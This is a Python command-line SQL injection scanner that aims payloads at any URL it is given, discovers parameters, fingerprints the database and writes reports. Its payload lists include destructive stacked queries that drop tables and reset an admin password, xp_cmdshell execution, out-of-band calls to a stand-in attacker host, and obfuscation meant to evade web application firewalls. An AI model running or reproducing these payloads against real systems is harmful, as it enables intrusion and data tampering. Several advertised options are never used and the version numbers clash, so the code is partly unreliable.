#!/usr/bin/env python3
"""
 SQL Injection tool v1.0.0
A comprehensive security tool for detecting SQL injection vulnerabilities.
"""

import argparse
import csv
import json
import requests
import sys
import time
import random
import re
import logging
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs, urljoin
from typing import List, Dict, Optional, Any, Tuple
from difflib import SequenceMatcher
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('sqli_scanner.log')
    ]
)
logger = logging.getLogger(__name__)


class ReportGenerator:
    """Generates comprehensive scan reports in multiple formats."""

    def __init__(self, results: List[Dict[str, Any]], start_time: float):
        self.results = results
        self.start_time = start_time
        self.end_time = time.time()

    def summary(self) -> Dict[str, Any]:
        """Generate scan summary statistics."""
        total = len(self.results)
        positives = [r for r in self.results if r.get('positive')]
        warnings = [r for r in self.results if r.get('mode') == 'warning']

        return {
            'start_time': datetime.fromtimestamp(self.start_time, timezone.utc).isoformat(),
            'end_time': datetime.fromtimestamp(self.end_time, timezone.utc).isoformat(),
            'duration_seconds': round(self.end_time - self.start_time, 2),
            'total_tests': total,
            'positive_findings': len(positives),
            'negative_findings': total - len(positives),
            'warnings': len(warnings),
            'success_rate': round(len(positives) / total * 100, 2) if total > 0 else 0
        }

    def generate_json(self, output: str) -> None:
        """Generate JSON report."""
        try:
            report = {
                'meta': self.summary(),
                'details': self.results,
                'scan_info': {
                    'version': '2.0.0',
                    'tool': 'Advanced SQLi Scanner'
                }
            }
            with open(output, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            logger.info("JSON report generated: %s", output)
        except IOError as e:
            logger.error("Failed to write JSON report: %s", e)

    def generate_csv(self, output: str) -> None:
        """Generate CSV report."""
        try:
            with open(output, 'w', newline='', encoding='utf-8') as f:
                writer = csv.DictWriter(f, fieldnames=[
                    'timestamp', 'mode', 'payload', 'info', 'positive',
                    'status_code', 'url', 'param', 'confidence'
                ])
                writer.writeheader()
                for r in self.results:
                    writer.writerow(r)
            logger.info("CSV report generated: %s", output)
        except IOError as e:
            logger.error("Failed to write CSV report: %s", e)

    def generate_html(self, output: str) -> None:
        """Generate HTML report."""
        try:
            summary = self.summary()
            html_content = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>SQL Injection Scan Report</title>
                <style>
                    body {{ font-family: Arial, sans-serif; margin: 20px; }}
                    .summary {{ background: #f5f5f5; padding: 15px; border-radius: 5px; }}
                    .positive {{ color: #d9534f; font-weight: bold; }}
                    .negative {{ color: #5cb85c; }}
                    .warning {{ color: #f0ad4e; }}
                    table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
                    th, td {{ padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }}
                    th {{ background-color: #f2f2f2; }}
                </style>
            </head>
            <body>
                <h1>SQL Injection Scan Report</h1>
                <div class="summary">
                    <h2>Scan Summary</h2>
                    <p><strong>Duration:</strong> {summary['duration_seconds']}s</p>
                    <p><strong>Total Tests:</strong> {summary['total_tests']}</p>
                    <p><strong>Positive Findings:</strong> {summary['positive_findings']}</p>
                    <p><strong>Success Rate:</strong> {summary['success_rate']}%</p>
                    <p><strong>Time:</strong> {summary['start_time']} to {summary['end_time']}</p>
                </div>
                <h2>Detailed Results</h2>
                <table>
                    <tr>
                        <th>Timestamp</th><th>Mode</th><th>Parameter</th>
                        <th>Payload</th><th>Result</th><th>Info</th>
                    </tr>
            """

            for result in self.results:
                status_class = "positive" if result['positive'] else "negative"
                status_text = "VULNERABLE" if result['positive'] else "SAFE"
                html_content += f"""
                    <tr>
                        <td>{result['timestamp']}</td>
                        <td>{result['mode']}</td>
                        <td>{result['param']}</td>
                        <td><code>{result['payload'][:50]}{'...' if len(result['payload']) > 50 else ''}</code></td>
                        <td class="{status_class}">{status_text}</td>
                        <td>{result['info']}</td>
                    </tr>
                """

            html_content += """
                </table>
            </body>
            </html>
            """

            with open(output, 'w', encoding='utf-8') as f:
                f.write(html_content)
            logger.info("HTML report generated: %s", output)
        except IOError as e:
            logger.error("Failed to write HTML report: %s", e)

    def print_summary(self) -> None:
        """Print summary to console."""
        s = self.summary()
        print("\n" + "="*50)
        print("SCAN SUMMARY")
        print("="*50)
        print(f"Duration:        {s['duration_seconds']}s")
        print(f"Total Tests:     {s['total_tests']}")
        print(f"Vulnerabilities: {s['positive_findings']}")
        print(f"Success Rate:    {s['success_rate']}%")
        print(f"Time Range:      {s['start_time']} to {s['end_time']}")
        print("="*50)


class SQLiScanner:
    """Main SQL injection scanner class."""

    def __init__(self, args: Optional[argparse.Namespace] = None):
        # Session and connection settings
        self.session = requests.Session()
        self.timeout = 10
        self.max_workers = 5
        self.method = 'GET'
        self.static_params: Dict[str, str] = {}
        self.headers: Dict[str, str] = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        self.dbms = 'unknown'
        self.cookies = {}
        self.verify_ssl = False

        # Target settings
        self.url = ''
        self.param = ''
        self.target_params = []

        # Results storage
        self.results: List[Dict[str, Any]] = []
        self.start_time = time.time()

        # CLI controls
        self.batch = None
        self.output = None

        # Baseline for response comparison
        self.baseline_text = ''
        self.baseline_time = 0.0

        # Payloads
        self.payloads: Dict[str, List[str]] = {}
        self.load_payloads()

        # Apply arguments if provided
        if args:
            self.apply_args(args)

    def load_payloads(self):
        """Load SQL injection payloads categorized by technique and DBMS."""
        # Base payload templates
        self.payloads = {
            'error': [
                "'", "\"", "';", "\";",
                "`", "')", "\")", "`);",
                "' OR 1=1-- ", "\" OR 1=1-- ",
                "' OR 'a'='a", "\" OR \"a\"=\"a"
            ],
            'union': [
                "' UNION SELECT {cols}-- ",
                "') UNION SELECT {cols}-- ",
                "\") UNION SELECT {cols}-- ",
                "' UNION ALL SELECT {cols}-- "
            ],
            'boolean': [
                "' AND 1=1-- ", "' AND 1=2-- ",
                "' OR 'a'='a", "' OR 'a'='b",
                "' AND (SELECT 1)=1-- ", "' AND (SELECT 1)=2-- "
            ],
            'blind': [
                "' AND SLEEP(5)-- ",
                "' AND 1=IF(2>1,SLEEP(5),0)-- ",
                "' WAITFOR DELAY '0:0:5'-- "
            ],
            'time': [
                "' OR SLEEP(5)-- ",
                "'; SLEEP(5)-- ",
                "' OR BENCHMARK(5000000,MD5('test'))-- ",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- "
            ],
            'stacked': [
                "'; EXEC xp_cmdshell('dir')-- ",
                "'; SELECT pg_sleep(5)-- ",
                "'; DROP TABLE dummy-- ",
                "'; UPDATE users SET password='hacked' WHERE user='admin'-- "
            ],
            'oob': [
                "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'-- ",
                "' UNION SELECT LOAD_FILE('\\\\attacker.com\\test.txt')-- "
            ]
        }

        # DBMS-specific payload enhancements
        dbms_payloads = {
            'mysql': {
                'error': [
                    "' AND EXTRACTVALUE(1,CONCAT(0x5c,USER()))-- ",
                    "' AND UPDATEXML(1,CONCAT(0x5c,USER()),1)-- "
                ],
                'union': ["' UNION SELECT @@version,{cols}-- "],
                'time': ["' OR IF(1=1,SLEEP(5),0)-- "],
                'oob': ["' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/test'-- "]
            },
            'mssql': {
                'error': [
                    "' AND 1=CONVERT(int, (SELECT @@version))-- ",
                    "' AND 1=CAST((SELECT @@version) AS int)-- "
                ],
                'time': ["'; WAITFOR DELAY '0:0:5'-- "],
                'stacked': ["'; EXEC sp_configure 'show advanced options',1-- "]
            },
            'oracle': {
                'error': [
                    "' AND ORA_INVOKING_USER() IS NOT NULL-- ",
                    "' AND (SELECT COUNT(*) FROM ALL_USERS)=1-- "
                ],
                'union': ["' UNION SELECT banner,NULL FROM v$version-- "],
                'time': ["' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1-- "]
            },
            'postgres': {
                'error': [
                    "' AND CAST(version() AS INTEGER)-- ",
                    "' AND (SELECT CAST(version() AS INTEGER))>0-- "
                ],
                'time': ["'; SELECT pg_sleep(5)-- "],
                'stacked': ["'; DROP TABLE IF EXISTS dummy-- "]
            }
        }

        # Merge DBMS-specific payloads
        if hasattr(self, 'dbms') and self.dbms in dbms_payloads:
            for category, payload_list in dbms_payloads[self.dbms].items():
                self.payloads.setdefault(category, []).extend(payload_list)

    def apply_args(self, args: argparse.Namespace):
        """Apply command line arguments to scanner configuration."""
        if args.url:
            self.parse_url(args.url)
        self.param = args.param if args.param else ''
        self.method = args.method or self.method
        self.max_workers = args.threads or self.max_workers

        for kv in args.params or []:
            k, v = kv.split('=', 1)
            self.static_params[k] = v

        for h in args.header or []:
            k, v = h.split('=', 1)
            self.headers[k] = v

        self.batch = args.batch
        self.output = args.output
        self.verify_ssl = not args.insecure

    def parse_url(self, full_url: str):
        """Parse target URL and extract parameters."""
        try:
            p = urlparse(full_url)
            if not p.scheme:
                full_url = 'http://' + full_url
                p = urlparse(full_url)

            self.url = f"{p.scheme}://{p.netloc}{p.path}"
            for k, vs in parse_qs(p.query).items():
                self.static_params[k] = vs[0]
                self.target_params.append(k)

            logger.info("Parsed URL: %s", self.url)
            logger.info("Found parameters: %s", self.target_params)

        except Exception as e:
            logger.error("Failed to parse URL: %s", e)
            raise

    def discover_parameters(self) -> List[str]:
        """Discover parameters from URL, forms, and JavaScript."""
        logger.info("Discovering parameters...")
        all_params = set(self.target_params)  # Start with URL parameters

        try:
            response = self.session.get(
                self.url,
                headers=self.headers,
                timeout=self.timeout,
                verify=self.verify_ssl
            )

            if response.status_code == 200:
                # Extract from HTML forms
                form_params = self._extract_form_parameters(response.text)
                all_params.update(form_params)

                # Extract from JavaScript
                js_params = self._extract_js_parameters(response.text)
                all_params.update(js_params)

                # Common parameter names
                common_params = self._get_common_parameters()
                all_params.update(common_params)

        except requests.RequestException as e:
            logger.warning("Parameter discovery request failed: %s", e)

        params_list = list(all_params)
        logger.info("Discovered %d parameters: %s",
                    len(params_list), params_list)
        return params_list

    def _extract_form_parameters(self, html: str) -> List[str]:
        """Extract parameters from HTML forms."""
        form_params = []
        try:
            # Form input fields
            input_pattern = r'<input[^>]+name=[\'"]([^\'"]+)[\'"]'
            textarea_pattern = r'<textarea[^>]+name=[\'"]([^\'"]+)[\'"]'
            select_pattern = r'<select[^>]+name=[\'"]([^\'"]+)[\'"]'

            for pattern in [input_pattern, textarea_pattern, select_pattern]:
                matches = re.findall(pattern, html, re.IGNORECASE)
                for match in matches:
                    if len(match) > 1 and match.lower() not in ['submit', 'button', 'csrf_token']:
                        form_params.append(match)

        except Exception as e:
            logger.warning("Form parameter extraction failed: %s", e)

        return list(set(form_params))

    def _extract_js_parameters(self, html: str) -> List[str]:
        """Extract parameters from JavaScript code."""
        js_params = []
        try:
            patterns = [
                r'var\s+([a-zA-Z0-9_]+)\s*=',
                r'let\s+([a-zA-Z0-9_]+)\s*=',
                r'const\s+([a-zA-Z0-9_]+)\s*=',
                r'param\s*:\s*[\'"]([^\'"]+)[\'"]',
                r'[\'"](\w+)[\'"]\s*:\s*[^{]',
            ]

            for pattern in patterns:
                matches = re.findall(pattern, html, re.IGNORECASE)
                js_params.extend(matches)

        except Exception as e:
            logger.warning("JS parameter extraction failed: %s", e)

        return list(set(js_params))

    def _get_common_parameters(self) -> List[str]:
        """Return common web application parameter names."""
        return [
            'id', 'user', 'username', 'password', 'email', 'search', 'query',
            'category', 'product', 'page', 'view', 'action', 'type', 'mode',
            'order', 'sort', 'limit', 'offset', 'q', 's'
        ]

    def fingerprint_dbms(self):
        """Enhanced DBMS fingerprinting with multiple techniques."""
        logger.info("Fingerprinting DBMS...")

        try:
            response = self.session.get(
                self.url,
                headers=self.headers,
                timeout=self.timeout,
                verify=self.verify_ssl
            )

            # Header-based detection
            server_header = response.headers.get('Server', '').lower()
            x_powered_by = response.headers.get('X-Powered-By', '').lower()

            if any(x in server_header for x in ['mysql', 'mariadb']):
                self.dbms = 'mysql'
            elif any(x in server_header for x in ['microsoft-iis', 'asp.net']):
                self.dbms = 'mssql'
            elif 'oracle' in server_header:
                self.dbms = 'oracle'
            elif 'postgres' in server_header:
                self.dbms = 'postgres'

            # Content-based detection
            content = response.text.lower()
            dbms_indicators = {
                'mysql': ['mysql', 'mysqli', 'mysql_fetch', 'mysql_error'],
                'mssql': ['microsoft sql server', 'sql server', 'odbc sql'],
                'oracle': ['oracle', 'ora-', 'pl/sql', 'oci_'],
                'postgres': ['postgresql', 'pg_', 'postgres']
            }

            for dbms, indicators in dbms_indicators.items():
                if any(indicator in content for indicator in indicators):
                    self.dbms = dbms
                    break

            # Error-based detection
            if self.dbms == 'unknown':
                param_to_use = self.get_fingerprint_param()
                test_payloads = {
                    'mysql': "' AND 1=1/*",
                    'mssql': "' AND 1=1--",
                    'oracle': "' AND 1=1 FROM DUAL--",
                    'postgres': "' AND 1=1--"
                }

                for dbms, payload in test_payloads.items():
                    error_resp = self.make_request(payload, param=param_to_use)
                    if error_resp and self.contains_errors(error_resp.text):
                        self.dbms = dbms
                        break

            logger.info("Detected DBMS: %s", self.dbms.upper())
            self.record('info', 'fingerprint',
                        f"DBMS: {self.dbms}", param="system")

        except requests.RequestException as e:
            logger.warning("DBMS fingerprinting failed: %s", e)

    def get_fingerprint_param(self) -> str:
        """Get parameter to use for fingerprinting."""
        if self.param:
            return self.param
        if self.target_params:
            return self.target_params[0]
        return "id"

    def analyze_site(self):
        """Analyze target site for security headers and configuration."""
        logger.info("Analyzing target site...")

        try:
            response = self.session.get(
                self.url,
                headers=self.headers,
                timeout=self.timeout,
                verify=self.verify_ssl
            )

            # Check security headers
            security_headers = {
                'Strict-Transport-Security': 'HSTS enabled',
                'Content-Security-Policy': 'CSP configured',
                'X-Frame-Options': 'Clickjacking protection',
                'X-Content-Type-Options': 'MIME sniffing prevention',
                'Referrer-Policy': 'Referrer policy configured',
                'Permissions-Policy': 'Permissions policy configured',
                'X-XSS-Protection': 'XSS protection'
            }

            for header, description in security_headers.items():
                if header in response.headers:
                    self.record('info', header, description,
                                positive=True, param="system")
                else:
                    self.record(
                        'warning', header, f'Missing: {description}', positive=False, param="system")

            # Check TLS
            if urlparse(self.url).scheme == 'https':
                self.record('info', 'HTTPS', 'Secure TLS connection',
                            positive=True, param="system")

        except requests.RequestException as e:
            logger.warning("Site analysis failed: %s", e)

    def capture_baseline(self, param: str):
        """Capture baseline response for comparison."""
        try:
            baseline_payload = "1"  # Normal value
            response = self.make_request(baseline_payload, param=param)
            if response:
                self.baseline_text = response.text
                self.baseline_time = self.measure_request_time(
                    baseline_payload, param=param)
        except Exception as e:
            logger.warning("Baseline capture failed: %s", e)

    def measure_request_time(self, payload: str, param: str, samples: int = 2) -> float:
        """Measure average request time for a payload."""
        total_time = 0.0
        successful_samples = 0

        for _ in range(samples):
            try:
                start_time = time.time()
                self.make_request(payload, param=param)
                request_time = time.time() - start_time
                total_time += request_time
                successful_samples += 1
            except Exception:
                continue

        return total_time / successful_samples if successful_samples > 0 else 0.0

    def contains_errors(self, text: str) -> bool:
        """Check if response contains SQL error indicators."""
        error_indicators = [
            'sql syntax', 'mysql_', 'pdoexception', 'odbc',
            'syntax error', 'unclosed quotation', 'unterminated quoted string',
            'ora-', 'pl/sql', 'postgresql', 'psql', 'microsoft ole db',
            'incorrect syntax', 'unexpected end', 'sqlcommand',
            'warning:', 'fatal error', 'database error'
        ]
        text_lower = text.lower()
        return any(indicator in text_lower for indicator in error_indicators)

    def is_different(self, text: str, threshold: float = 0.95) -> bool:
        """Check if response differs significantly from baseline."""
        if not self.baseline_text:
            return False

        # Check for error messages first
        if self.contains_errors(text) and not self.contains_errors(self.baseline_text):
            return True

        # Check content similarity using SequenceMatcher
        similarity = SequenceMatcher(None, self.baseline_text, text).ratio()
        return similarity < threshold

    def make_request(self, payload: str, param: str) -> Optional[requests.Response]:
        """Make HTTP request with SQLi payload."""
        try:
            # Apply payload obfuscation
            payload = self.obfuscate_payload(payload)

            if self.method.upper() == 'POST':
                data = self.static_params.copy()
                data[param] = payload
                return self.session.post(
                    self.url,
                    data=data,
                    headers=self.headers,
                    cookies=self.cookies,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )
            else:
                params = self.static_params.copy()
                params[param] = payload
                return self.session.get(
                    self.url,
                    params=params,
                    headers=self.headers,
                    cookies=self.cookies,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )

        except requests.RequestException as e:
            logger.debug("Request failed: %s", e)
            return None

    def obfuscate_payload(self, payload: str) -> str:
        """Obfuscate payload to bypass basic WAFs."""
        # Randomly apply obfuscation techniques
        techniques = [
            lambda p: p.replace(" ", "/**/"),
            lambda p: p.replace(" ", "%09"),  # Tab
            lambda p: p.replace(" ", "%0A"),  # Newline
            lambda p: p.replace("'", "%27"),
            lambda p: p.replace('"', "%22"),
            lambda p: p.replace("(", "%28").replace(")", "%29"),
        ]

        # Apply 1-2 random obfuscation techniques
        num_techniques = random.randint(1, 2)
        for _ in range(num_techniques):
            technique = random.choice(techniques)
            payload = technique(payload)

        return payload

    def record(self, mode: str, payload: str, info: str,
               positive: bool = False, status_code: Optional[int] = None,
               param: Optional[str] = None, confidence: str = "medium") -> None:
        """Record test result."""
        if param is None:
            param = self.param if self.param else "unknown"

        entry = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'mode': mode,
            'payload': payload,
            'info': info,
            'positive': positive,
            'status_code': status_code,
            'url': self.url,
            'param': param,
            'confidence': confidence
        }
        self.results.append(entry)

        # Log based on result type
        if positive:
            logger.warning("VULNERABILITY FOUND - %s: %s - %s",
                           mode.upper(), param, info)
        else:
            logger.info("%s: %s - %s", mode.upper(), param, info)

    def test_parameter(self, param: str):
        """Run all tests on a single parameter."""
        logger.info("Testing parameter: %s", param)

        # Capture baseline for this parameter
        self.capture_baseline(param)

        # Run tests based on configuration
        test_methods = [
            self.detect_error,
            self.do_union,
            self.do_boolean,
            self.do_blind,
            self.do_time,
            self.do_stacked,
        ]

        for test_method in test_methods:
            try:
                test_method(param)
            except Exception as e:
                logger.error("Test %s failed: %s", test_method.__name__, e)

    def detect_error(self, param: str):
        """Detect error-based SQL injection."""
        logger.debug("Testing error-based SQLi on %s", param)

        for payload in self.payloads['error']:
            response = self.make_request(payload, param=param)
            if not response:
                continue

            has_errors = self.contains_errors(response.text)
            self.record('error', payload,
                        'SQL errors detected' if has_errors else 'No errors',
                        positive=has_errors,
                        status_code=response.status_code,
                        param=param,
                        confidence='high' if has_errors else 'low')

    def do_union(self, param: str):
        """Detect UNION-based SQL injection."""
        logger.debug("Testing UNION-based SQLi on %s", param)

        # Find number of columns
        column_count = self._find_column_count(param)
        if column_count > 0:
            self.record('union', f'column_count:{column_count}',
                        f'Found {column_count} columns', positive=True, param=param)

            # Test union payloads
            for payload_template in self.payloads['union']:
                try:
                    payload = payload_template.format(cols=','.join(
                        [str(i) for i in range(1, column_count + 1)]))
                    response = self.make_request(payload, param=param)
                    if response and self.is_different(response.text):
                        self.record('union', payload, 'Union injection successful',
                                    positive=True, status_code=response.status_code, param=param)
                except Exception as e:
                    logger.debug("Union test failed: %s", e)
        else:
            self.record('union', 'column_detect', 'No union injection possible',
                        positive=False, param=param)

    def _find_column_count(self, param: str) -> int:
        """Find number of columns using ORDER BY technique."""
        for i in range(1, 15):  # Test up to 14 columns
            payload = f"' ORDER BY {i}-- "
            response = self.make_request(payload, param=param)
            if response and self.contains_errors(response.text):
                return i - 1
        return 0

    def do_boolean(self, param: str):
        """Detect boolean-based SQL injection."""
        logger.debug("Testing boolean-based SQLi on %s", param)

        true_payloads = ["' AND 1=1-- ", "' OR 'a'='a'-- "]
        false_payloads = ["' AND 1=2-- ", "' OR 'a'='b'-- "]

        for true_payload, false_payload in zip(true_payloads, false_payloads):
            true_response = self.make_request(true_payload, param=param)
            false_response = self.make_request(false_payload, param=param)

            if true_response and false_response:
                true_diff = self.is_different(true_response.text)
                false_diff = self.is_different(false_response.text)

                # Boolean-based injection typically shows different behavior for true/false
                is_vulnerable = true_diff != false_diff
                self.record('boolean', f"{true_payload}/{false_payload}",
                            f"Boolean injection detected" if is_vulnerable else "No boolean injection",
                            positive=is_vulnerable, param=param)

    def do_blind(self, param: str):
        """Detect blind SQL injection."""
        logger.debug("Testing blind SQLi on %s", param)

        # Use time-based detection for blind SQLi
        test_payload = random.choice(self.payloads['time'])
        start_time = time.time()
        response = self.make_request(test_payload, param=param)
        response_time = time.time() - start_time

        # Consider it vulnerable if response time is significantly longer than baseline
        is_vulnerable = response_time > self.baseline_time + 2.0

        self.record('blind', test_payload,
                    f"Time delay: {response_time:.2f}s" if is_vulnerable else "No time delay",
                    positive=is_vulnerable, param=param,
                    confidence='medium' if is_vulnerable else 'low')

    def do_time(self, param: str):
        """Detect time-based SQL injection."""
        logger.debug("Testing time-based SQLi on %s", param)

        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = {
                executor.submit(self._test_time_payload, payload, param): payload
                # Test first 3 time payloads
                for payload in self.payloads['time'][:3]
            }

            for future in as_completed(futures):
                payload = futures[future]
                try:
                    result = future.result()
                    if result:
                        self.record('time', payload, f"Time delay: {result:.2f}s",
                                    positive=True, param=param, confidence='high')
                    else:
                        self.record('time', payload, "No time delay",
                                    positive=False, param=param)
                except Exception as e:
                    logger.debug("Time-based test failed: %s", e)

    def _test_time_payload(self, payload: str, param: str) -> float:
        """Test a single time-based payload and return delay."""
        start_time = time.time()
        self.make_request(payload, param=param)
        return time.time() - start_time

    def do_stacked(self, param: str):
        """Detect stacked queries vulnerability."""
        logger.debug("Testing stacked queries on %s", param)

        # Test first 2 stacked payloads
        for payload in self.payloads['stacked'][:2]:
            response = self.make_request(payload, param=param)
            if response:
                is_different = self.is_different(response.text)
                self.record('stacked', payload,
                            'Stacked query executed' if is_different else 'No stacked query execution',
                            positive=is_different, status_code=response.status_code, param=param)

    def save_and_report(self):
        """Generate and save reports."""
        if not self.output:
            return

        report_generator = ReportGenerator(self.results, self.start_time)

        # Generate all report formats
        base_name = self.output.rsplit(
            '.', 1)[0] if '.' in self.output else self.output

        report_generator.generate_json(f"{base_name}.json")
        report_generator.generate_csv(f"{base_name}.csv")
        report_generator.generate_html(f"{base_name}.html")
        report_generator.print_summary()

    def run_scan(self):
        """Run the complete SQL injection scan."""
        logger.info("Starting SQL injection scan for: %s", self.url)

        # Initial setup
        self.fingerprint_dbms()
        self.analyze_site()

        # Discover parameters if needed
        if not self.target_params:
            self.target_params = self.discover_parameters()

        if not self.target_params:
            logger.error("No parameters found to test")
            return

        # Test parameters
        for param in self.target_params:
            self.test_parameter(param)

        # Generate reports
        self.save_and_report()

        logger.info("SQL injection scan completed")

    def interactive_mode(self):
        """Run scanner in interactive mode."""
        print("\n" + "="*60)
        print("Advanced SQL Injection Scanner")
        print("="*60)

        url = input("Target URL: ").strip()
        if not url:
            print("Error: URL is required")
            return

        self.parse_url(url)
        self.run_scan()

    def run(self):
        """Main entry point for the scanner."""
        if self.batch:
            # Batch mode
            if not self.url:
                logger.error("URL is required for batch mode")
                return

            if not self.param and not self.target_params:
                logger.error("Parameter is required for batch mode")
                return

            self.run_scan()
        else:
            # Interactive mode
            self.interactive_mode()


def main():
    """Main function with argument parsing."""
    parser = argparse.ArgumentParser(
        description='Advanced SQL Injection Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s -u "http://example.com/page?id=1" -p id
  %(prog)s -u "http://example.com/login" -X POST -p username -H "Content-Type=application/json"
  %(prog)s -u "http://example.com/search" --threads 10 -o scan_results
  %(prog)s -u "http://example.com/test" --discover-params --all-tests
  %(prog)s -u "http://example.com/api" --auth "admin:password" --proxy "http://127.0.0.1:8080"
        '''
    )

    # Target options
    target_group = parser.add_argument_group('Target Options')
    target_group.add_argument('-u', '--url',
                              help='Target URL (required for batch mode)')
    target_group.add_argument('-p', '--param',
                              help='Specific parameter to test')
    target_group.add_argument('-X', '--method', choices=['GET', 'POST'],
                              default='GET', help='HTTP method (default: GET)')
    target_group.add_argument('--discover-params', action='store_true',
                              help='Automatically discover parameters from forms and JavaScript')

    # Request options
    request_group = parser.add_argument_group('Request Options')
    request_group.add_argument('-P', '--params', action='append',
                               help='Static parameters (key=value)')
    request_group.add_argument('-H', '--header', action='append',
                               help='HTTP headers (key=value)')
    request_group.add_argument('-A', '--user-agent',
                               help='Custom User-Agent string')
    request_group.add_argument('--cookie', help='Cookie string')
    request_group.add_argument(
        '--auth', help='HTTP authentication (user:pass)')
    request_group.add_argument('--proxy', help='HTTP proxy (http://host:port)')
    request_group.add_argument('--timeout', type=int, default=10,
                               help='Request timeout in seconds (default: 10)')
    request_group.add_argument('--delay', type=float, default=0,
                               help='Delay between requests in seconds (default: 0)')
    request_group.add_argument('-k', '--insecure', action='store_true',
                               help='Skip SSL certificate verification')

    # Scan options
    scan_group = parser.add_argument_group('Scan Options')
    scan_group.add_argument('--dbms', choices=['mysql', 'mssql', 'oracle', 'postgres', 'auto'],
                            default='auto', help='Target DBMS (default: auto-detect)')
    scan_group.add_argument('--level', type=int, choices=[1, 2, 3], default=2,
                            help='Scan intensity level (1=light, 2=medium, 3=heavy)')
    scan_group.add_argument('--tests', nargs='+',
                            choices=['error', 'union', 'boolean',
                                     'blind', 'time', 'stacked', 'oob', 'all'],
                            default=['all'], help='Specific tests to run (default: all)')
    scan_group.add_argument('--skip-tests', nargs='+',
                            choices=['error', 'union', 'boolean',
                                     'blind', 'time', 'stacked', 'oob'],
                            help='Tests to skip')
    scan_group.add_argument('--threads', type=int, default=5,
                            help='Number of concurrent threads (default: 5)')
    scan_group.add_argument('--retries', type=int, default=2,
                            help='Number of retries for failed requests (default: 2)')

    # Output options
    output_group = parser.add_argument_group('Output Options')
    output_group.add_argument('-o', '--output',
                              help='Output file (without extension)')
    output_group.add_argument('--format', choices=['json', 'csv', 'html', 'all'],
                              default='all', help='Output format (default: all)')
    output_group.add_argument('-v', '--verbose', action='store_true',
                              help='Verbose output')
    output_group.add_argument('--debug', action='store_true',
                              help='Debug mode with detailed logging')
    output_group.add_argument('--quiet', action='store_true',
                              help='Suppress non-essential output')

    # Batch mode options
    batch_group = parser.add_argument_group('Batch Mode Options')
    batch_group.add_argument('-b', '--batch', action='store_true',
                             help='Batch mode (non-interactive)')
    batch_group.add_argument('-i', '--input',
                             help='Input file with URLs (one per line)')
    batch_group.add_argument(
        '--resume', help='Resume from previous scan results file')

    # Advanced options
    advanced_group = parser.add_argument_group('Advanced Options')
    advanced_group.add_argument('--waf-bypass', action='store_true',
                                help='Enable WAF bypass techniques')
    advanced_group.add_argument('--encoding', choices=['none', 'url', 'double-url', 'base64'],
                                default='url', help='Payload encoding (default: url)')
    advanced_group.add_argument('--max-payloads', type=int, default=50,
                                help='Maximum payloads per test type (default: 50)')
    advanced_group.add_argument('--risk', type=int, choices=[1, 2, 3], default=2,
                                help='Risk level (1=low, 2=medium, 3=high)')

    args = parser.parse_args()

    # Configure logging based on verbosity
    if args.quiet:
        logging.getLogger().setLevel(logging.ERROR)
    elif args.verbose:
        logging.getLogger().setLevel(logging.INFO)
    elif args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    # Validate arguments
    if not validate_args(args):
        return 1

    try:
        # Initialize scanner
        scanner = SQLiScanner(args)

        # Run in appropriate mode
        if args.batch or args.url:
            if args.input:
                # Batch file mode
                process_batch_file(args.input, scanner, args)
            else:
                # Single URL batch mode
                scanner.run_scan()
        else:
            # Interactive mode
            scanner.interactive_mode()

        return 0

    except KeyboardInterrupt:
        logger.info("Scan interrupted by user")
        return 130
    except Exception as e:
        logger.error("Fatal error: %s", e)
        if args.debug:
            import traceback
            traceback.print_exc()
        return 1


def validate_args(args: argparse.Namespace) -> bool:
    """Validate command line arguments."""

    # Check for required arguments in batch mode
    if args.batch and not args.url and not args.input:
        logger.error("Batch mode requires either --url or --input")
        return False

    # Validate URL format if provided
    if args.url and not args.url.startswith(('http://', 'https://')):
        logger.warning("URL should start with http:// or https://")

    # Check output file permissions
    if args.output:
        try:
            with open(f"{args.output}.test", 'w') as f:
                f.write('test')
            import os
            os.remove(f"{args.output}.test")
        except IOError as e:
            logger.error("Cannot write to output location: %s", e)
            return False

    # Validate thread count
    if args.threads < 1 or args.threads > 50:
        logger.error("Thread count must be between 1 and 50")
        return False

    # Validate timeout
    if args.timeout < 1:
        logger.error("Timeout must be at least 1 second")
        return False

    return True


def process_batch_file(input_file: str, scanner: SQLiScanner, args: argparse.Namespace):
    """Process a batch file containing multiple URLs."""
    try:
        with open(input_file, 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]

        logger.info("Processing %d URLs from batch file", len(urls))

        for i, url in enumerate(urls, 1):
            logger.info("Scanning URL %d/%d: %s", i, len(urls), url)

            try:
                # Update scanner with current URL
                scanner.parse_url(url)
                scanner.run_scan()

            except Exception as e:
                logger.error("Failed to scan %s: %s", url, e)
                continue

            # Add delay between scans if specified
            if args.delay > 0 and i < len(urls):
                time.sleep(args.delay)

    except FileNotFoundError:
        logger.error("Input file not found: %s", input_file)
    except Exception as e:
        logger.error("Error processing batch file: %s", e)


if __name__ == '__main__':
    sys.exit(main())

